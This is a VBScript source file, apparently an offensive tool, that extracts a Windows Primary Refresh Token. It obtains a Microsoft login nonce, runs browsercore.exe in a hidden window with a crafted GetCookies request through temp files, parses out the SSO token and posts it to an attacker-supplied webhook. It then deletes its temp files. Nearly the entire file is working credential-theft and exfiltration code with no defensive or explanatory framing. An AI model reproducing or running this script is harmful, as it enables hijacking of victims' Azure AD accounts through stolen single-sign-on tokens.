' VBScript implementation of PRT token extraction
' Usage: cscript //Nologo Get-UserPRTToken.vbs <webhook_url>

Option Explicit

Dim webhookUrl, http, nonceResp, nonce, fso, shell, programFiles, windir
Dim locations, browserCore, i, jsonRequest, jsonStr, tempPath
Dim inputFile, outputFile, stream, textStream, length, fileStream
Dim rawOutput, jsonStart, jsonResponse, parsed, prtToken, httpPost

' Check arguments
If WScript.Arguments.Count = 0 Then
    WScript.Echo "[!] Usage: cscript //Nologo Get-UserPRTToken.vbs <webhook_url>"
    WScript.Quit 1
End If

webhookUrl = WScript.Arguments(0)

On Error Resume Next

' Step 1: Get nonce from Microsoft
WScript.Echo "[*] Requesting nonce..."
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "POST", "https://login.microsoftonline.com/Common/oauth2/token", False
http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
http.Send "grant_type=srv_challenge"

If Err.Number <> 0 Then
    WScript.Echo "[!] Error requesting nonce: " & Err.Description
    WScript.Quit 1
End If

If http.Status <> 200 Then
    WScript.Echo "[!] Failed to get nonce: HTTP " & http.Status
    WScript.Quit 1
End If

' Parse nonce from JSON response
Dim responseText
responseText = http.responseText
nonce = ExtractJsonValue(responseText, "Nonce")

If nonce = "" Then
    WScript.Echo "[!] No nonce in response"
    WScript.Quit 1
End If

WScript.Echo "[+] Nonce obtained: " & Left(nonce, 20) & "..."

' Step 2: Locate browsercore.exe
WScript.Echo "[*] Locating browsercore.exe..."
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

programFiles = shell.ExpandEnvironmentStrings("%ProgramFiles%")
windir = shell.ExpandEnvironmentStrings("%windir%")

Dim browserCorePaths(1)
browserCorePaths(0) = programFiles & "\Windows Security\BrowserCore\browsercore.exe"
browserCorePaths(1) = windir & "\BrowserCore\browsercore.exe"

browserCore = ""
For i = 0 To UBound(browserCorePaths)
    If fso.FileExists(browserCorePaths(i)) Then
        browserCore = browserCorePaths(i)
        Exit For
    End If
Next

If browserCore = "" Then
    WScript.Echo "[!] browsercore.exe not found in standard locations"
    WScript.Quit 1
End If

WScript.Echo "[+] Found: " & browserCore

' Step 3: Prepare JSON request
WScript.Echo "[*] Preparing BrowserCore request..."
jsonStr = "{""method"":""GetCookies"",""uri"":""https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" & nonce & """,""sender"":""https://login.microsoftonline.com""}"

' Step 4: Create temporary input file with length-prefixed JSON
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
inputFile = tempPath & "\prt_input_" & Int(Rnd() * 100000) & ".bin"
outputFile = tempPath & "\prt_output_" & Int(Rnd() * 100000) & ".txt"

' Write 4-byte length prefix + JSON using ADODB.Stream
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open

' Calculate UTF-8 byte length
length = GetUTF8ByteLength(jsonStr)

' Write 4-byte little-endian length prefix
stream.Write CreateLengthPrefix(length)

' Write UTF-8 JSON
Set textStream = CreateObject("ADODB.Stream")
textStream.Type = 2 ' Text
textStream.Charset = "UTF-8"
textStream.Open
textStream.WriteText jsonStr
textStream.Position = 0
textStream.Type = 1 ' Convert to binary
textStream.CopyTo stream
textStream.Close

stream.SaveToFile inputFile, 2 ' Overwrite
stream.Close

If Err.Number <> 0 Then
    WScript.Echo "[!] Error creating input file: " & Err.Description
    WScript.Quit 1
End If

' Step 5: Execute browsercore.exe with redirected I/O
WScript.Echo "[*] Executing browsercore.exe..."
Dim cmd, result
cmd = "cmd /c """ & browserCore & """ < """ & inputFile & """ > """ & outputFile & """"
result = shell.Run(cmd, 0, True) ' Hidden window, wait for completion

If Err.Number <> 0 Then
    WScript.Echo "[!] Error executing browsercore.exe: " & Err.Description
    Cleanup inputFile, outputFile
    WScript.Quit 1
End If

' Step 6: Read output
If Not fso.FileExists(outputFile) Then
    WScript.Echo "[!] browsercore.exe produced no output"
    Cleanup inputFile, outputFile
    WScript.Quit 1
End If

Set fileStream = fso.OpenTextFile(outputFile, 1) ' Read
rawOutput = fileStream.ReadAll()
fileStream.Close

' Cleanup temp files
Cleanup inputFile, outputFile

' Step 7: Parse JSON response
WScript.Echo "[*] Parsing response..."
jsonStart = InStr(rawOutput, "{")

If jsonStart = 0 Then
    WScript.Echo "[!] No JSON found in browsercore.exe output"
    WScript.Quit 1
End If

jsonResponse = Mid(rawOutput, jsonStart)

' Extract status and PRT token
Dim status, errorCode, errorDesc
status = ExtractJsonValue(jsonResponse, "status")

If status = "Fail" Then
    errorCode = ExtractJsonValue(jsonResponse, "code")
    errorDesc = ExtractJsonValue(jsonResponse, "description")
    WScript.Echo "[!] PRT retrieval failed: " & errorCode & " - " & errorDesc
    SendToWebhook webhookUrl, "[ERROR] " & errorCode & " - " & errorDesc
    WScript.Quit 1
End If

prtToken = ExtractNestedJsonValue(jsonResponse, "response", "data")

If prtToken = "" Then
    WScript.Echo "[!] No PRT token found in response"
    WScript.Quit 1
End If

WScript.Echo "[+] PRT successfully extracted!"

' Step 8: Send to webhook
WScript.Echo "[*] Sending to webhook..."
SendToWebhook webhookUrl, prtToken

WScript.Echo ""
WScript.Echo "[+] PRT Token:"
WScript.Echo prtToken

' ===== Helper Functions =====

Function ExtractJsonValue(jsonText, key)
    ' Simple JSON value extraction (works for simple string values)
    Dim pattern, regex, matches
    pattern = """" & key & """\s*:\s*""([^""]+)"""
    Set regex = New RegExp
    regex.Pattern = pattern
    regex.IgnoreCase = True
    Set matches = regex.Execute(jsonText)

    If matches.Count > 0 Then
        ExtractJsonValue = matches(0).SubMatches(0)
    Else
        ExtractJsonValue = ""
    End If
End Function

Function ExtractNestedJsonValue(jsonText, parentKey, childKey)
    ' Extract value from nested JSON: response.data
    Dim pattern, regex, matches, nestedJson
    pattern = """" & parentKey & """\s*:\s*\{([^\}]+)\}"
    Set regex = New RegExp
    regex.Pattern = pattern
    regex.IgnoreCase = True
    Set matches = regex.Execute(jsonText)

    If matches.Count > 0 Then
        nestedJson = matches(0).SubMatches(0)
        ExtractNestedJsonValue = ExtractJsonValue(nestedJson, childKey)
    Else
        ExtractNestedJsonValue = ""
    End If
End Function

Function GetUTF8ByteLength(str)
    ' Calculate UTF-8 byte length
    Dim i, code, len
    len = 0
    For i = 1 To Len(str)
        code = AscW(Mid(str, i, 1))
        If code < 128 Then
            len = len + 1
        ElseIf code < 2048 Then
            len = len + 2
        ElseIf code < 65536 Then
            len = len + 3
        Else
            len = len + 4
        End If
    Next
    GetUTF8ByteLength = len
End Function

Function CreateLengthPrefix(length)
    ' Create 4-byte little-endian length prefix
    Dim prefixStream
    Set prefixStream = CreateObject("ADODB.Stream")
    prefixStream.Type = 1 ' Binary
    prefixStream.Open

    ' Write 4 bytes in little-endian order
    prefixStream.Write CreateByte(length And &HFF)
    prefixStream.Write CreateByte((length \ 256) And &HFF)
    prefixStream.Write CreateByte((length \ 65536) And &HFF)
    prefixStream.Write CreateByte((length \ 16777216) And &HFF)

    prefixStream.Position = 0
    CreateLengthPrefix = prefixStream.Read()
    prefixStream.Close
End Function

Function CreateByte(value)
    ' Create a single byte
    Dim byteStream
    Set byteStream = CreateObject("ADODB.Stream")
    byteStream.Type = 1 ' Binary
    byteStream.Open

    ' Write byte using a text stream conversion trick
    Dim tempText
    Set tempText = CreateObject("ADODB.Stream")
    tempText.Type = 2 ' Text
    tempText.Charset = "iso-8859-1" ' Single-byte encoding
    tempText.Open
    tempText.WriteText Chr(value)
    tempText.Position = 0
    tempText.Type = 1
    tempText.CopyTo byteStream
    tempText.Close

    byteStream.Position = 0
    CreateByte = byteStream.Read(1)
    byteStream.Close
End Function

Sub SendToWebhook(url, data)
    On Error Resume Next
    Dim httpPost
    Set httpPost = CreateObject("MSXML2.XMLHTTP")
    httpPost.Open "POST", url, False
    httpPost.setRequestHeader "Content-Type", "text/plain"
    httpPost.Send data

    If Err.Number = 0 Then
        If httpPost.Status >= 200 And httpPost.Status < 300 Then
            WScript.Echo "[+] Successfully sent to webhook!"
        Else
            WScript.Echo "[!] Webhook returned HTTP " & httpPost.Status
        End If
    Else
        WScript.Echo "[!] Error sending to webhook: " & Err.Description
    End If
End Sub

Sub Cleanup(file1, file2)
    On Error Resume Next
    If fso.FileExists(file1) Then fso.DeleteFile file1
    If fso.FileExists(file2) Then fso.DeleteFile file2
End Sub
